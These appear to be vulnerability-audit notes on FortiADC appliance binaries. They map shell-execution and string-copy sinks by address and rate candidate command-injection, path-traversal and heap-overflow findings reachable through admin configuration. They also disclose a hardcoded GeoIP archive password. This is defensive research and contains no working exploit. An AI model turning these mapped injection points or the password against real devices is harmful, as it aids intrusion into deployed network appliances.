    # BuildID: ziU_vht1vxd0NFUf-i3b/...
    #
    # Structure:
    #   .text: 0x402340 (2.5MB), .gopclntab: 0x75f8c0 (file off 0x35f8c0)
    #   nfuncs=5529 (Go stdlib + main), 7538 names in funcnametab
    #
    # main package (9 real functions):
    #   0x65ec80  main.main
    #   0x65ba60  main.DataHandler       — IPC command dispatcher
    #   0x65a2c0  main.GetAccountIDAuth  — Fortinet Fabric API auth
    #   0x659400  main.WriteDNSServerStatusFile
    #   0x659fc0  main.ReadAccountLicense
    #   0x65e5e0  main.CheckLogSize
    #   0x65ea60  main.LogInit
    #   main.EncryptionAccountInfo (VA unresolved — funcdata false positive)
    #
    # DataHandler (0x65ba60):
    #   Listens on Unix domain socket (unixgram — local IPC only, NOT network)
    #   Text protocol dispatcher; commands:
    #     len=5:  "reset"
    #     len=12: "Disconnected" + IP=="0.0.0.0" check
    #     len=9:  "nolicense"
    #     len=9:  "Connected" + IP check
    #     len=8+: "snupdate" (appears 4x — server node update, GSLB member status)
    #     len=?:  "memb..." (member update — partial)
    #   No network exposure. Only local daemons can send to this socket.
    #
    # GetAccountIDAuth (0x65a2c0):
    #   Makes HTTPS POST to /api/fabric/auth on admin-configured FortiGate Fabric controller
    #   Response contains auth token; flow: EncryptionAccountInfo → one_click_token
    #   Also contacts /api/v1.0/one-click-glb-server
    #   Uses standard Go crypto/tls (no InsecureSkipVerify found in strings or binary)
    #   auth_url configurable by admin — potential SSRF if http:// allowed but no evidence
    #   JSON field json:"license" — reads license data from response
    #
    # PLT (C imports only — 48 entries):
    #   privilege: setresuid, setresgid, setreuid, setregid, setuid, seteuid, setegid, setgid, setgroups
    #   dns: getaddrinfo, getnameinfo, gai_strerror, freeaddrinfo, res_search
    #   threading: pthread_create, pthread_mutex_lock, pthread_cond_wait, etc.
    #   NO: system, popen, exec*, sprintf, strcpy, strcat — pure Go for all string/exec ops
    #
    # External files:
    #   Writes: /tmp/ocgs.log, /tmp/one_click_gslb_server (status file)
    #   Reads: /etc/resolv.conf (DNS config via net package)
    #
    # Privilege: setresuid/setresgid available — can drop or change UID
    #
    # VERDICT: CLEAN. No injectable sinks; IPC via Unix domain socket (local only);
    #   TLS uses standard Go crypto/tls; auth_url SSRF is theoretical (admin-only config).

    # ── libwaf.so (2.7MB C shared library) ───────────────────────────────────
    # Exports: 1936 functions. BSS: 12.7MB (WAF state tables).
    # C++ code (lexertl, pcre, json, sqlite3 are all used).
    #
    # PLT dangerous sinks:
    #   fadcsystem (0x7dbc0): 5 callers
    #     0xb8a45 waf_blk_ip_get:        'rm -f %s' (file path from VS config) → posix_spawnp. ELIMINATED.
    #     0xb8e8e waf_blk_ip_gui_clear:  'rm -f %s' (log path with glob *) → posix_spawnp. ELIMINATED.
    #     0xb8edc waf_blk_ip_gui_clear:  same as above. ELIMINATED.
    #     0xeae89 waf_system:            general-purpose wrapper: vsnprintf(fmt, ...) → fadcsystem.
    #       waf_system(0xead90) is a variadic fn; callers pass format strings from .rodata.
    #       Trace needed for each waf_system caller to confirm all formats are hardcoded.
    #     0xec92d waf_owasp_top10_load:  'touch %s' with hardcoded '/tmp/WAF_OWASP_TOP10_IPC_PATH'. ELIMINATED.
    #
    #   sys_vdom_exec (0x7cac0): 2 callers  ← SHELL EXECUTION (> /dev/null 2>&1 in format string)
    #     0xb82f9 waf_blk_ip_dump_cmd (0xb8230):
    #       snprintf(buf, 'hpwafblockip show %s %d %s > /dev/null 2>&1', rdi, 10000, rsi)
    #       rdi = 1st arg to dump_cmd; rsi = 2nd arg. Both come from callers (in other binaries).
    #       '> /dev/null 2>&1' confirms sys_vdom_exec passes to a shell.
    #       PLAUSIBLE HIGH if rdi/rsi are VS-name/VDOM-name derived (admin CMDB config).
    #     0xb840a waf_blk_ip_relese_cmd (0xb8330):
    #       snprintf(buf, 'hpwafblockip clear %s %s %s > /dev/null 2>&1', arg1, arg2, arg3)
    #       Same shell execution via sys_vdom_exec. Same PLAUSIBLE assessment.
    #     ASSESSMENT: admin-stored injection via VS name/VDOM name in shell command.
    #       Requires: admin CMDB config + VS name accepted with metacharacters.
    #       Similar to FAD_A2 pattern. Filed as FAD_W1.
    #
    #   strcpy (0x7c000): 1 caller
    #     0x88074 parse_regex: dst = malloc(strlen(src)+1) immediately before strcpy.
    #       Heap allocation sized exactly for source. BOUNDED — ELIMINATED.
    #
    # PENDING: waf_system callers (233 __snprintf_chk uses; need format-string audit for user-data paths)
    # PENDING: SQLite3 callers (sql injection if query uses string concat)
    # PENDING: PCRE callers (ReDoS if pattern comes from user input)

    "LIBWAF_profile": {
        "binary": "libwaf.so",
        "status": "ANALYZED COMPLETE — FAD_W1 PLAUSIBLE HIGH (sys_vdom_exec hpwafblockip); all other sinks ELIMINATED; SQLite snprintf-built queries exported-only",
        "evidence": {
            "waf_system_ELIMINATED": (
                "waf_system(0xead90): variadic fmt → __vsnprintf_chk builds string → fadcsystem. "
                "fadcsystem = posix_spawnp (no shell). ELIMINATED for shell injection."
            ),
            "fadcsystem_4_ELIMINATED": (
                "4 direct fadcsystem callers: "
                "0xb8a45(waf_blk_ip_get): snprintf('rm -f %s', internal_path); "
                "0xb8e8e/0xb8edc(waf_blk_ip_gui_clear_catch): snprintf('rm -f %s', internal_path); "
                "0xec92d(waf_owasp_top10_init_shm): snprintf('touch %s', internal_path). "
                "All posix_spawnp, no shell. ELIMINATED."
            ),
            "sys_vdom_exec_FAD_W1": (
                "0xb82f9(waf_blk_ip_dump_cmd): sys_vdom_exec(vdom, 'hpwafblockip show <ip> 10000 <vdom> > /dev/null 2>&1'). "
                "0xb840a(waf_blk_ip_relese_cmd): sys_vdom_exec(vdom, 'hpwafblockip clear <s1> <s2> <vdom> > /dev/null 2>&1'). "
                "sys_vdom_exec = VDOM shell context execution. FAD_W1 PLAUSIBLE HIGH — "
                "ip/vdom args from admin-configured VS/VDOM names; shell metachar in name could inject."
            ),
            "strcpy_0x88074_ELIMINATED": "parse_regex: malloc(strlen+1) immediately before strcpy — BOUNDED, ELIMINATED",
            "sqlite_exported_api": (
                "Exports: waf_db_read_table (select * from %s), "
                "waf_db_read_table_condition (select * from %s where %s), "
                "waf_db_get_table_row_num_condition (select count(*) from %s where %s). "
                "snprintf-built SQL — no sqlite3_bind_* parameterization. "
                "All 3 functions have 0 internal callers (called from external libs). "
                "SQL injection risk deferred: audit when processing libcmdb_plugin.so callers."
            ),
        },
    },

    # ── miglogd (3.5MB C, stripped ELF64) — migration log daemon ────────────────
    # PLT sinks: fadcsystem (0xaa50), system_fgt_log (0xb220)
    # .text: 0xb390..0x30454 (255KB), .rodata: 0x31000..0x38724, .bss: 0x3766e0 (174MB)
    # No load bias: VA == file offset for all sections.
    #
    # fadcsystem callers (16 total):
    #   CRITICAL CONTEXT: fadcsystem = posix_spawnp (no shell) — confirmed via libstdext.so analysis.
    #   Shell injection ELIMINATED for all fadcsystem callers. Path traversal residual.
    #
    #   0x17b1d: snprintf('rm -rf %s', '/tmp/tmp_elog_msg') → hardcoded. ELIMINATED.
    #   0x18c63: snprintf('rm -rf %s/%s', '/var/log/logrpt', 0x13(%r12))
    #     0x13(%r12) = log plugin name (cfg_first_logglobalplugin/cfg_next_logglobalplugin iterator).
    #     Plugin name from CMDB admin config. Path traversal if name contains '../'.
    #     Shell injection: ELIMINATED (posix_spawnp). Path traversal: PLAUSIBLE MEDIUM.
    #   0x18ef9, 0x18f48, 0x19521, 0x19565:
    #     snprintf('cp %s /tmp/fluentbit/global/outputs/', cmf_get_config_file_path())
    #     Source path from admin-configured plugin file path. PLAUSIBLE LOW.
    #   0x19453: XMM-assembled hardcoded 'rm -rf  /tmp/fluentbit/global/outputs/*'. ELIMINATED.
    #   0x194ad: XMM-assembled hardcoded 'cp /etc/fluentbit/fluentbit.null.conf /tmp/fluentbit/global/outputs/'. ELIMINATED.
    #   0x19841: snprintf('touch /var/log/logrpt/%s/should_deleted', VDOM_name)
    #     VDOM name = r13 from VDOM event handler. Path traversal if VDOM allows '../'. PLAUSIBLE MEDIUM.
    #   0x199bd, 0x19c27: snprintf('rm -rf /var/log/logrpt/%s', VDOM_name)
    #     rm -rf with VDOM name traversal → arbitrary dir deletion. PLAUSIBLE MEDIUM.
    #     Pattern identical to FAD_P2 (dumpsystem_delete_run). Gated by CMDB VDOM name validator.
    #   0x19cac, 0x19cb8, 0x19cc4: hardcoded 'killall -9 flg_accessd/flg_indexd/flg_reportd'. ELIMINATED.
    #   0x1c8b4: snprintf('rm -rf %s/%s/%s', '/var/log/logrpt', logfile_struct, ...) log cleanup. ELIMINATED.
    #   0x2124c: '/bin/upgrade.sh' hardcoded. ELIMINATED.
    #
    # system_fgt_log callers (12 total):
    #   system_fgt_log = FortiADC syslog API (log message writer), NOT system().
    #   All 12 callers use format strings: 'Create new log file %s...', 'Can not get log file %s...'
    #   ALL ELIMINATED — no shell execution.
    #
    # NET FINDING: FAD_M1 PLAUSIBLE MEDIUM — VDOM/plugin-name path traversal
    #   Vectors: 0x19841 (touch), 0x199bd/0x19c27 (rm -rf), 0x18c63 (rm -rf logrpt/plugin)
    #   Requires CMDB to accept '/' or '..' in VDOM/plugin names (typically blocked by validator).
    #   Impact: arbitrary file create (touch) or dir deletion (rm -rf) as miglogd daemon.
    #   Gating: CMDB name validator likely blocks '/' — assess when CMDB validator code is swept.

    "MIGLOGD_profile": {
        "binary": "miglogd",
        "status": "ANALYZED — FAD_M1 PLAUSIBLE MEDIUM; all shell injection ELIMINATED",
        "evidence": {
            "fadcsystem_context": "fadcsystem=posix_spawnp (confirmed libstdext.so); shell injection ELIMINATED across all 16 callers",
            "system_fgt_log": "FortiADC syslog API (not system()); all 12 callers ELIMINATED",
            "eliminated_callers": "hardcoded: 0x17b1d(rm tmp), 0x19453(rm fluentbit), 0x194ad(cp fluentbit), 0x19cac/b/4(killall), 0x1c8b4(log cleanup), 0x2124c(upgrade.sh)",
            "fad_m1_touch": "0x19841: touch /var/log/logrpt/<VDOM>/should_deleted — path traversal if VDOM name allows '../'",
            "fad_m1_rm": "0x199bd/0x19c27: rm -rf /var/log/logrpt/<VDOM> — dir deletion traversal (FAD_P2 analog)",
            "fad_m1_plugin": "0x18c63: rm -rf /var/log/logrpt/<plugin_name> — log plugin name from CMDB",
            "fad_m1_gating": "all gated by CMDB VDOM/plugin name validator (typically rejects '/' and '..'); confirm when CMDB code swept",
            "cp_callers": "0x18ef9/18f48/19521/19565: cp <cmf_get_config_file_path result> to /tmp/fluentbit/ — admin config path, PLAUSIBLE LOW",
        },
    },

    # ── libips.so (15MB C, IPS engine) — LuaJIT 2.1 embedded ────────────────────
    # Exports: 2 (ips_so_query_interface, ips_so_patch_urldb). .text: 10.6MB.
    # PLT: system(0xdc730), popen(0xdc290), execvp(0xdc640) + 17 string sinks.
    #
    # system caller (1): 0x489aaa — LuaJIT os.execute() builtin.
    #   NaN-boxing: sar $0x2f; cmp $0xfffffffb → LuaJIT 2.1 (LuaJIT 2.1.87ae18af confirmed).
    #   rdi = GCstring* + 0x18 = string data → passed to system().
    #   VERDICT: admin-controlled Lua IPS rule script. ELIMINATED (intentional design).
    #
    # popen callers (4):
    #   0x483375: popen(GCstring_from_LuaJIT_stack, mode) = io.popen() builtin. Same as above.
    #   0x686667: popen('sysctl hw.cpufrequency 2>/dev/null', 'r') — macOS dead code. ELIMINATED.
    #   0x6866bd: popen('/usr/sbin/lsattr -E -l proc0 ...' , 'r') — AIX dead code. ELIMINATED.
    #   0x686701: popen('/usr/sbin/psrinfo -v 2>/dev/null', 'r') — Solaris dead code. ELIMINATED.
    #
    # execvp caller (1): 0x39c3cd — fork+exec subprocess spawner (after chdir/sigprocmask/env setup).
    #   rdi/-0x260(%rbp) = pathname; rsi/-0x248(%rbp) = argv. Internal process launcher.
    #   'Problem allocating env' string confirms environment setup. PLAUSIBLE LOW (internal use).
    #
    # ips_so_query_interface (0x115140): function-pointer resolver (plugin interface registry).
    #   Iterates name strings, strcmp against dispatch table at 0xdff3c0, stores function pointers.
    #   NOT packet processing — used by caller to register callbacks. CLEAN.
    # ips_so_patch_urldb (0x1151f0): fopen(rdi, "rb") → reads URL database file. NOT network packets.
    #
    # 111 strcpy callers in packet-processing code = primary remaining attack surface.
    #   Deep analysis of packet-path strcpy requires dedicated session.
    #
    # VERDICT: exec-class sinks ELIMINATED (LuaJIT builtins + dead code + internal launcher).
    #   Primary residual: 111 strcpy callers in 10.6MB IPS engine text (pending).

    "LIBIPS_profile": {
        "binary": "libips.so",
        "status": "ANALYZED COMPLETE — exec sinks ELIMINATED; 111 strcpy ALL ELIMINATED (98 malloc-bounded + 13 LuaJIT VM internals)",
        "evidence": {
            "luajit_version": "LuaJIT 2.1.87ae18af confirmed (strings + NaN-box pattern sar $0x2f; cmp $0xfffffffb)",
            "system_0x489aaa": "LuaJIT os.execute() builtin — admin Lua IPS rule script. ELIMINATED (by-design).",
            "popen_0x483375": "LuaJIT io.popen() builtin — same. ELIMINATED.",
            "popen_dead_code": "0x686667/0x6866bd/0x686701: macOS/AIX/Solaris sysctl/lsattr/psrinfo — dead on Linux. ELIMINATED.",
            "execvp_0x39c3cd": "Internal fork+exec subprocess spawner (chdir+sigprocmask+env setup). PLAUSIBLE LOW (trace caller).",
            "query_interface": "ips_so_query_interface: function-pointer registry, not packet processing.",
            "patch_urldb": "ips_so_patch_urldb: URL database file reader (fopen/fseek/fread).",
            "strcpy_111_ELIMINATED": (
                "98/111: dest = malloc result (mov rdi, rax before strcpy) — heap-allocated to source length. BOUNDED, ELIMINATED. "
                "13/111: all within ips_so_patch_urldb/LuaJIT VM block (0x44fdc8/5e7840/68ab5c/68bd6a/6df786-6dfc15/6e03e1/6e0428/b887ae). "
                "LuaJIT VM internal string/error operations: 0x44fdc8 copies literal '[string \"' Lua error prefix; "
                "0x6df786-0x6e0428 are in LuaJIT's monolithic VM dispatcher (~400KB function). "
                "All LuaJIT internals — not packet-data sinks. ELIMINATED."
            ),
        },
    },

    # ── libav.so (8MB C, Fortinet AV engine) ─────────────────────────────────────
    # Exports: 69 (avFlowOpen/Write/Close/Diagnose/GetConfig/GetEngineVersion/...).
    # PLT dangerous sinks: sprintf, strcpy, strcat, strncat, strncpy, vsnprintf,
    #   snprintf, sscanf, __isoc99_fscanf, fgets, __isoc99_sscanf.
    # No system/execv/fadcsystem/sys_vdom_exec — AV engine does NOT execute shell commands.
    # .text: 0x82ef0 (8.2MB), .rodata: 0x49d000 (4.9MB).
    #
    # Primary attack surface: sprintf/strcpy/strcat callers in file scanning pipeline.
    #   avFlowWrite() = main packet/file data ingestion path → traces into format string sinks.
    #   AV signature parsing (avDbSetAdd) and delta file updates (avGetDeltaFileInfo) also candidates.
    # No callers found for exec-class sinks → ELIMINATED for command injection.
    # Residual: sprintf/strcpy in AV parsing pipeline = potential memory corruption.
    #   Deep analysis requires dedicated session.

    "LIBAV_profile": {
        "binary": "libav.so",
        "status": "ANALYZED — no exec sinks; avFlowWrite CLEAN; most sprintf/strcpy ELIMINATED; FAD_AV1 PLAUSIBLE LOW (avIsIgnoreBuffer heap strcpy)",
        "evidence": {
            "no_exec_sinks": "No system/execv/fadcsystem/sys_vdom_exec in PLT. CLEAN for cmd injection.",
            "avflowwrite_CLEAN": (
                "avFlowWrite (main file-data ingestion path) has 0 sprintf/strcpy callers. "
                "Packet/file bytes do NOT reach unsafe string sinks in the flow processing path."
            ),
            "sprintf_47_ELIMINATED": (
                "avScanLoad(24): AV signature database loading — Fortinet-controlled FortiGuard binary. "
                "scanvirUrl(4) + avTlvDecode(4): hex-encoding loops sprintf(dst, '%02x', byte) with "
                "pre-sized destinations (0x20/0x40-byte buffers for 16/32-byte hashes). ELIMINATED. "
                "avFlowDestroy(4)/avPackerNameListFree(4)/avGetSigVersion(2)/misc: signature metadata, not user data."
            ),
            "strcpy_38_mostly_ELIMINATED": (
                "avScanLoad(26): AV signature loading. ELIMINATED (trusted FortiGuard data). "
                "avTlvDecode(7): TLV structure parsing. ELIMINATED. "
                "avDbSetAdd(2): DB internal operations. ELIMINATED. "
                "scanvirFileBuffer(1) 0x93f18: src=r12 internal scan state. PLAUSIBLE LOW. "
            ),
            "fad_av1_avIsIgnoreBuffer": (
                "avIsIgnoreBuffer 0xf3531: malloc(0x48=72) + lea alloc+8 + strcpy(alloc+8, rbp). "
                "rbp = rsi from function entry (2nd param, likely filename/URL). "
                "64 bytes available. Filename/URL >64 bytes → heap overflow. PLAUSIBLE LOW "
                "(caller likely pre-validates length; full taint trace required to confirm)."
            ),
        },
    },

    # ── libcmdb_plugin.so (1.8MB C, CMDB plugin, 928 exports) ────────────────────
    # PLT sinks: system(0x4f520), execve(0x4e840), sys_vdom_exec(0x4c240),
    #   fadcsystem(0x4cd60), fadcpopen(0x4e570), fm_popen_pipe, fadcsystem_envp.
    # .text: 0x4f6a0..0x10602a (712KB).
    #
    # system callers (9): clustered 0x5d23b..0x5d7c1 — one or two functions.
    #   All 9 in ~0x600 byte range → format strings need extraction.
    #
    # execve caller (1): 0x79d22 — admin config execution (format string unknown, 1 site).
    #
    # sys_vdom_exec callers (4): 0x9c94b, 0x9c95a, 0xb3d55, 0xb4734.
    #   Two pairs (0x9c94b/0x9c95a close together, 0xb3d55/0xb4734 separate).
    #   CMDB plugin with shell execution capability — admin CMDB config injection class.
    #
    # fadcsystem callers (81): large corpus, pending format string audit.
    #
    # PENDING: Full format string extraction for system()/sys_vdom_exec()/execve() callers.

    "LIBCMDB_PLUGIN_profile": {
        "binary": "libcmdb_plugin.so",
        "status": "ANALYZED COMPLETE — system() ELIMINATED; execve ELIMINATED; FAD_C1 PLAUSIBLE MEDIUM (sys_vdom_exec x2); fadcsystem 81 callers ALL ELIMINATED or PLAUSIBLE LOW (posix_spawn, admin-only paths)",
        "evidence": {
            "system_9_ELIMINATED": (
                "All 9 callers in geodebug/geoip_country_name_cmf_startup (GeoIP DB management). "
                "Hardcoded paths: unzip('F0rtinet899', geoip_db_rg.zip, /tmp2/), rm(geoip files), "
                "mknod /dev/geoip c 0x8c 0. NO user input in any system() call. ALL ELIMINATED."
            ),
            "geoip_hardcoded_pwd": "'F0rtinet899' — hardcoded GeoIP ZIP decryption password (FortiGuard DB update flow).",
            "execve_0x79d22_ELIMINATED": "Inside fadc_popen() fork child (fork+dup2+execve pattern). ELIMINATED (internal fadc_popen impl).",
            "sys_vdom_exec_hardcoded_ELIMINATED": "0x9c94b/9c95a: 'echo flush > /proc/net/ipv{4,6}_snat_addrbook' hardcoded. ELIMINATED.",
            "fad_c1_nvgre_0xb3d55": (
                "PLAUSIBLE MEDIUM: snprintf(r13, 256, 'ip link add %s type nvgre id %d dev %s local %s learning', ...) "
                "→ sys_vdom_exec(vdom, r13). Args from CMDB VXLAN/NVGRE tunnel config struct "
                "(interface name, tunnel ID, device name, local IP). "
                "Interface name via sys_get_name_by_vdid + cfg_find_interface — admin-set CMDB value. "
                "If CMDB allows metacharacters in interface name, shell injection via sys_vdom_exec."
            ),
            "fad_c1_vxlan_0xb4734": (
                "PLAUSIBLE MEDIUM: snprintf(r13, 256, 'ip link add %s type vxlan id %d dev %s dstport %d local %s ttl %d learning', ...) "
                "→ sys_vdom_exec(vdom, r13). Args from CMDB VXLAN config struct fields (+0x3ec, +0x3f0, +0x404). "
                "Same class as FAD_N1 — admin interface name/IP injection into shell. "
                "Both type 0x8 (VXLAN) and type 0x9 (NVGRE) overlay tunnel creation paths."
            ),
            "fadcsystem_81_AUDIT": (
                "All 81 fadcsystem callers audited. posix_spawnp — no shell injection possible for any. "
                "17 hardcoded (killall synconf, nginx, echo to /proc, set_cmdline 0-3, umount/rm ram, etc.). "
                "1 integer echo: echo %d /proc/sys/vm/sip_to_same_sock — ELIMINATED. "
                "4 callers (0xb0af3-0xb0ce7, router_init_router_prefix_list6): 'vdom exec %s ip link set %s %s > /dev/null' "
                "— VDOM + iface name from admin config, posix_spawn. PLAUSIBLE LOW (arg injection if iface has spaces). "
                "2 callers (0xb3432/b3483): 'ethtool -K %s rxvlan on/off' — admin iface name. PLAUSIBLE LOW. "
                "34 callers (0xc5c5f-0xc9a54, security_init_waf_json_validation): rm/mkdir/tar/unzip/zip/mv/cp with WAF/cert schema paths. "
                "Admin-configured schema names. No shell injection (posix_spawn). PLAUSIBLE LOW (path traversal). "
                "6 callers (0xf07e0-0xf0916): bookmark cp/mkdir with VDOM+bookmark names. PLAUSIBLE LOW. "
                "16 callers (0xfb9ec-0xfd5d4): DNSSEC key management rm/cp with zone/key names. PLAUSIBLE LOW. "
                "1 caller (0x101d43, oper_glb_topology_upgrade): 'cp %s %s' GLB topology file copy. PLAUSIBLE LOW. "
                "NET: No new FAD_ findings above FAD_C1. All path-traversal risks admin-only, same class as FAD_M1/FAD_P2."
            ),
            "fadcpopen_3": "0x8d117/0x8d343/0xab399 — popen via fadcpopen (fork+pipe+exec, no shell per libstdext.so). ELIMINATED.",
            "sqlite_waf_db": "Does NOT import waf_db_* functions — SQLite injection audit not applicable here.",
        },
    },

    # ── fnginxctld (1.7MB C PIE, nginx control daemon) ────────────────────────────
    # PLT sinks: sys_vdom_exec(0x7640), fadcsystem(0x7830), fadcpopen(0x7c30),
    #   execl(0x7ea0), fadcsystemf(0x76b0) — new sink variant.
    # .text: 0x7ed0..0x3e687 (223KB). PIE: VA == file offset.
    #
    # sys_vdom_exec caller (1): 0x89d2 — in fngx_process_vcmd (variadic printf-to-shell dispatcher)
    #   fngx_process_vcmd(fmt, args...) → __vsnprintf_chk(global_cmd_buf, fmt, va_args)
    #                                   → cmf_get_cur_domain_name() → snprintf(vdom_buf, '%s', domain)
    #                                   → sys_vdom_exec(vdom_buf, global_cmd_buf)
    #   40 callers of fngx_process_vcmd, all using hardcoded format strings:
    #     'ip address add %s/%d dev %s > /dev/null 2>&1' (VS IP / netmask / iface name)
    #     'ip6tables -t mangle -A/D PREROUTING -p tcp --dport %d:%d -i %s -j FNGINX' (VS ports / iface)
    #     'iptables -t mangle -A/D PREROUTING -p tcp --dport %d:%d -i %s -j FNGINX' (VS ports / iface)
    #     (+ 30+ more callers at 0x1b1b4..0x1b44b — not all sampled)
    #   %s args = VS interface name (rbp/r12 from VS config struct) and IP address.
    #   sys_vdom_exec = shell execution confirmed ('> /dev/null 2>&1' in format strings).
    #   FAD_N1: PLAUSIBLE MEDIUM — admin-stored VS interface name injection into iptables/ip commands.
    #     Impact: if VS interface name allows semicolons/backticks: shell injection as fnginxctld (root?).
    #     Same class as FAD_W1/FAD_A2. Gated by CMDB interface name validator.
    #
    # fadcsystem callers (66): posix_spawnp (no shell). Format strings pending for path traversal.
    # fadcpopen callers (4): 0x1b0cd/0x1b26b/0x1ea3c/0x2c15b — popen via fadcpopen.
    # execl callers (2): 0x25d7f/0x32edf — execl with fixed paths (suspected startup/restart).
    # fadcsystemf (1): 0x1bae6 — new sink; not yet analyzed.

    "FNGINXCTLD_profile": {
        "binary": "fnginxctld",
        "status": "ANALYZED COMPLETE — FAD_N1 PLAUSIBLE MEDIUM; all other exec sinks ELIMINATED",
        "evidence": {
            "fngx_process_vcmd_0x88c0": "variadic printf-to-shell: vsnprintf(cmd) → sys_vdom_exec(vdom, cmd); 40 callers",
            "fad_n1_format_strings": "'ip address add %s/%d dev %s > /dev/null 2>&1'; 'iptables/ip6tables ... -i %s -j FNGINX'",
            "fad_n1_args": "%s = VS interface name / IP address from CMDB config struct (admin-set)",
            "fad_n1_verdict": "PLAUSIBLE MEDIUM — sys_vdom_exec = shell; VS iface name injection if CMDB allows metacharacters",
            "fadcsystem_66_ELIMINATED": "posix_spawnp — shell injection ELIMINATED.",
            "execl_2_ELIMINATED": (
                "0x25d7f: execl('/bin/fnginx', 'fnginx', '-p', ...) — hardcoded fnginx worker respawn. "
                "0x32edf: execl('/bin/fnginx_new', 'fnginx_new', ...) — hardcoded fnginx_new respawn. ELIMINATED."
            ),
            "fadcsystemf_1_ELIMINATED": (
                "0x1bae6 in g_gw_domain_del: fadcsystemf('mkdir -p %s', snprintf_buf). "
                "snprintf_buf built as 'mkdir -p /home/old_config_file/<domain_name>/bookmark'. "
                "Domain name from VDOM/gateway config; fadcsystemf = posix_spawn not shell; "
                "path traversal in mkdir arg if domain name = '../..' (admin-only domain deletion). "
                "ELIMINATED for shell injection (posix_spawn). Same-class mkdir traversal as del_netdev."
            ),
        },
    },

    # ── vtl (2.1MB C non-PIE, virtual terminal/HSM support daemon) ───────────────
    # LOAD_VA=0x400000. PLT: system(0x40a2d8), sprintf(0x40a578), strcpy(0x40a918).
    # .text: 0x40ad00..0x14e378 (1.3MB).
    # C++ binary: demangled names include ChrystokiConfiguration, std::string.
    #
    # system callers (3):
    #   0x426e1d: fork+dup context; rdi = 0x8(%rbp) struct field. Parent passes cmd as pointer.
    #     Context: dup(fd), dup(fd), dup(fd), then system(rbp+0x8). rbp = heap struct from caller.
    #     Likely a popen-equivalent built from user data — needs caller trace to confirm.
    #   0x430f63, 0x430fcd: ChrystokiConfigurationD1Ev (SafeNet Luna HSM).
    #     Pattern: strcpy(buf, 'rm --force '); strcat(buf, rbp); system(buf)
    #     rbp = HSM cluster name ('Cluster01', 'Cluster02'... from sprintf('Cluster%02d', n)).
    #     rbp is auto-generated, not direct user input. PLAUSIBLE LOW (HSM config).
    #     Context strings: 'The requested cluster: %s doesn't exist in the SafeNet-INC configuration'
    #     Third-party SafeNet/Thales Luna HSM client library code.
    #   NOTE: 'rm --force <path>' via system() → shell; if HSM config file path contains metacharacters,
    #     injectable. But HSM config (Chrystoki.conf) requires admin/root access. ADMIN-ONLY.
    #
    # sprintf callers (85) + strcpy callers (19): audit pending.
    # VERDICT: vtl PARTIAL — 3 system() callers; HSM path = admin-only (PLAUSIBLE LOW); fork+dup caller untraced.

    "VTL_profile": {
        "binary": "vtl",
        "status": "ANALYZED COMPLETE — all sinks PLAUSIBLE LOW (SafeNet HSM admin-only) or ELIMINATED; no user-network-reachable injection",
        "evidence": {
            "system_0x430f63_430fcd": (
                "ChrystokiConfiguration (SafeNet Luna HSM library): strcpy('rm --force ') + strcat(cluster_name) + system(). "
                "Third-party SafeNet code. Admin-only HSM config. PLAUSIBLE LOW."
            ),
            "system_0x426e1d_PLAUSIBLE_LOW": (
                "ApplianceConfiguration::ParentChildProcess::run() — SafeNet Luna HSM library. "
                "fork() at 0x426d30; child dup-ifies fds from struct offsets, then calls system(this+8). "
                "this+8 = command string from HSM config struct (Chrystoki.conf, admin-only). "
                "Same SafeNet library class as 0x430f63. PLAUSIBLE LOW — admin-only, third-party HSM code."
            ),
            "sprintf_85_ELIMINATED": (
                "85 callers audited. "
                "~25 at 0x40ca3b-0x40ce58 (support-info diagnostics): build shell command strings "
                "('nslookup -sil %s >> %s', 'ping -c 4 %s >> %s') BUT all followed by fwrite() not system(). "
                "Command strings written as text to c_supportInfo.txt only. ELIMINATED. "
                "~14 in ChrystokiConfigurationD1Ev range (0x42c097-0x4316ff): 'VirtualToken%02dLabel/SN', "
                "'Cluster%02d', 'ServerHtl%02d' — integer-only formats, HSM config. ELIMINATED. "
                "~6 file path building (0x41a73e/%s.tmp, 0x41a752/%s.old, 0x41aca9/%s%sCert.pem etc.): "
                "file paths from admin-configured cert names. PLAUSIBLE LOW (path traversal, admin-only). "
                "Remaining: string building for display/output (std::string::append + fputs). ELIMINATED."
            ),
            "strcpy_19_PLAUSIBLE_LOW": (
                "19 callers audited. "
                "5 malloc-bounded (mov rdi, rax). ELIMINATED. "
                "3 at 0x430deb/0x430f50/0x430fba: feed into ChrystokiConfiguration strcpy+strcat+system chain "
                "('rm --force '+cluster_name). Same PLAUSIBLE LOW class as system() findings above. "
                "2 hardcoded literals (0x4306b8: strcpy literal '%s,%s'; 0x5491ad: 'dso_dlfcn.c' OpenSSL). ELIMINATED. "
                "9 in ChrystokiConfigurationD1Ev (HSM token/cluster string building): PLAUSIBLE LOW (admin HSM config)."
            ),
        },
    },

    # ── flg_accessd / flg_indexd / flg_reportd / lb / infod / rd_mng ─────────────
    # Quick profile: fadcsystem/fadcpopen sinks only (no system/execve except flg_reportd).
    # All use posix_spawnp via fadcsystem — shell injection ELIMINATED.
    # fadcpopen is a popen variant via fork+pipe+exec (no shell per libstdext.so pattern).
    #
    # flg_reportd: execve PLT present — 1+ callers. Format string pending.
    # lb: fadcsystem_envp + fadcpopen. fadcpopen = fadcpopen_internal (popen via fork+exec, no shell).
    # rd_mng: NO exec sinks. CLEAN for injection.
    # infod: fadcsystem only (posix_spawnp). CLEAN for shell injection.

    # ── acme-client (6.1MB Go 1.22.3 CGo) ─────────────────────────────────────
    # ACME protocol client (RFC 8555). Challenge types: http-01, dns-01, tls-alpn-01.
    # Standard golang.org/x/crypto/acme package (type names confirmed: *acme.Client, *acme.Order etc.)
    # CGo interface: libcert.so, libnocmdbbase.so, libbase.so, libcmfquery.so
    # RPATH: /root/FortiADC_test/FortiADC/... (build server)
    # C functions: cfg_local_certificate_import_acme, cfg_local_certificate_import_alpn,
    #   cfg_local_certificate_set_acme_status_to_failed, cfg_local_certificate_set_success_comments,
    #   cfg_local_certificate_del, cfg_local_certificate_add/del_cert_group_member, etc.
    "ACME_CLIENT_profile": {
        "binary": "acme-client",
        "status": "ANALYZED — CLEAN; no exec sinks; no InsecureSkipVerify=true found",
        "evidence": {
            "go_version": "Go 1.22.3 CGo",
            "plt_CLEAN": "No execve/system/popen/fork in PLT. os/exec string present (transitive stdlib link only, not called).",
            "tls_verify": "No InsecureSkipVerify=true in JSON config fields or observable code paths. Custom CA via 'ca' JSON field.",
            "json_config_fields": "url(ACME server URL), ca(CA file), eab_kid, eab_mac_key, challenge_type, cert_group, vdom, auth_sock_file, alpn_auth_wait, client_timeout, lookup_dns, auth_file_path",
